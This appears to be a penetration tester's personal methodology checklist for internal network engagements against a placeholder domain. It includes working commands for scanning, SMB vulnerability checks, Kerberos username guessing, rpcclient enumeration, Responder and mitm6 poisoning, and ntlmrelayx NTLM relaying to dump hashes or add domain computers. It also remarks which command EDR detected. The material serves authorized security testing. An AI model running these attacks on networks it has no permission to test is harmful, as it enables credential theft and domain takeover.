# Pentest Methodology
This will address methodology, things to remember, things to try if you're stuck, and things like these during pentests. The focus will be for a 5-day pentest focusing on stealing cardholder data or breaking into a segmented network; however, most of these techniques can be used for any type of offensive security engagement though.

The focus here is on steps to take, tools to run, things to check. Other files in this repo have the specific commands to run. I've linked to those where possible.

## Things to Not Forget
- Day 1: Focus on recon, scanning, and information gathering.
  - [ ] Begin scanning the target network segment to see if anything can reach it
  - [ ] If wireless is in scope, set this up and let it run/capture
  - [ ] Ask a contact to access the target network and verify the way they do it + document -- if remote, get documentation
  - [ ] Map out the network & target environment -- don't worry about exploitation yet, diligence in enumeration will pay off
  - [ ] Start password spraying soon, being mindful of lockout policy (just ask)

- Day 2: Focus on foothold
  - [ ] Attempt to get a foothold/creds if you don't already have one
  - [ ] Once you have a foothold, map out the directory enviro

## Open Source Intelligence

## Wireless

## Network Scanning & Enumeration
- [ ] Kick off a Nessus scan if applicable
- [ ] Ping sweep
- [ ] Kick off a big top 1024 scan. Don't forget to log it in case the scans hang up. Increase to `-T5` if you're feeling adventurous:
   ```
   mkdir scans
   nmap -iL subnets-firenation.lst -sV -sC -T5 -oA firenation-sV-sC -v | tee scans/nmap.log
   ```
- [ ] Parse through open ports with: https://raw.githubusercontent.com/altjx/ipwn/master/nmap_scripts/nmapscrape.rb
- [ ] Perform reverse DNS lookups on the domain: `nmap -iL subnets-firenation.lst -sL -oA dns-lookup`
- [ ] Scan for SMB and for SMB Signing: `crackmapexec smb open-ports/445.txt | tee scans/cme-smb-scan.log`
- [ ] Get list of SMB open and scan for top MS vulns: `nmap -iL open-ports/445.txt -p445 --script=smb-vuln-ms08-067,smb-vuln-ms17-010 -v | tee scans/nmap-smb-vulns.log`
- [ ] Check for Jenkins instances. [TODO: get Jenkins ports]
- [ ] SNMP checks
- Check for NULL sessions: rpcclient to get info from DC's
- KRB guessing
    pushd /opt/
    wget http://www.cqure.net/tools/krbguess-0.21-bin.tar.gz
    tar xvf krbguess-0.21-bin.tar.gz
    rm  krbguess-0.21-bin.tar.gz
    echo "alias krbguess='/usr/lib/jvm/java-8-openjdk-amd64/bin/java -jar /opt/KrbGuess/krbguess.jar'" >>  /root/.bash_aliases
    popd
    # check out: https://github.com/insidetrust/statistically-likely-usernames
    krbguess --realm firenation.com --server dc.firenation.com --dict ~/opt/jsmith.txt -o krbguess-jsmith-checkfree.txt
- rpcclient
    - Null session is `rpcclient -U '' dc.firenation.com`. MUST include the -U ''
    - Auth session is `rpcclient -U 'azula%F!r3R0cks!' dc.firenation.com`. Interesting cmds:
        - `enumdomusers` - get all the users (probably includes disabled/old accounts too)
- multirelay https://www.secureauth.com/blog/what-old-new-again-relay-attack
- kerberoasting
- asrep roasting

- Check for `sa:sa` and similar
- Scan for eternalblue, bluekeep (esp Win7), and similar
- Check for webmail/Exchange -- mailsniper, ruler, etc
    - https://github.com/sensepost/ruler/wiki/Homepage
    - Log in to O365 or internal and own their mailbox
- Local priv esc: 
    - https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation
    - https://book.hacktricks.xyz/windows/windows-local-privilege-escalation
    - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS

## Getting a Foothold
 - [ ] Begin running [Responder](https://github.com/SpiderLabs/Responder):
    ```
    apt update && apt install -y responder
    responder -I eth0 -wrf
    ```
 - [ ] Run [mitm6](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/):
    ```
    pip install mitm6
    mitm6 -i eth0 -d firenation.com --debug 
    ```
    *Note: Every time I've run this, it has caused network disruptions. Proceed with caution and check out params `-hw` and `-hb`*
    
 - [ ] Relay NTLM authentication from the above poisoning (this specifically is for `mitm6`)
    ```
    ## Should relay to victim via SMB. Needs local admin (I think maybe RID500...need to verify)
    ntlmrelayx.py --ipv6 -wh wpad.firenation.com -of net-ntlmv2.hsh                   # Attempt to dump SAM 
    ntlmrelayx.py --ipv6 -wh wpad.firenation.com -of net-ntlmv2.hsh -c "systeminfo"   # Runs "systeminfo". Caught by CrowdStrike.

    ## LDAPS NTLM relay (patches may fix this!). Any Domain User can add up to 10 computers by default. Compy can be used for BloodHound.
    ntlmrelayx.py --ipv6 -wh wpad.firenation.com -t ldaps://dc.firenation.com --add-computer
    ##
    ```
 - [ ] If you get hashes, go to [Password Cracking]() checklist
 - [ ] If you crack hashes or get access to network creds, go to [Lateral Movement & Domain PrivEsc]()

## Local PrivEsc

## Lateral Movement & Domain PrivEsc

## Persistence & Data Exfil

## Web App Pentesting
